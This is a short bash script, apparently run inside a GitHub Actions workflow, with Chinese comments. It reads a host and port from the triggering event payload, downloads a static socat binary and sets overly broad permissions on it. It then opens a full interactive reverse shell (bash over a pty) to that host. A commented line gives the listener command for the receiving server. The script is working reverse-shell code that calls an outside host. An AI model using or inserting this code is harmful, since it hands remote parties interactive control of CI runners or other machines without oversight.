#!/bin/bash

# api变量解析
jshost=`cat $GITHUB_EVENT_PATH | jq ".client_payload.host" | sed 's/\"//g'`
jsport=`cat $GITHUB_EVENT_PATH | jq ".client_payload.port" | sed 's/\"//g'`

[ -f "./socat" ] || wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
chmod 7777 socat

# 服务器先开启
# ./socat file:`tty`,raw,echo=0 tcp-listen:8888
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$jshost:$jsport
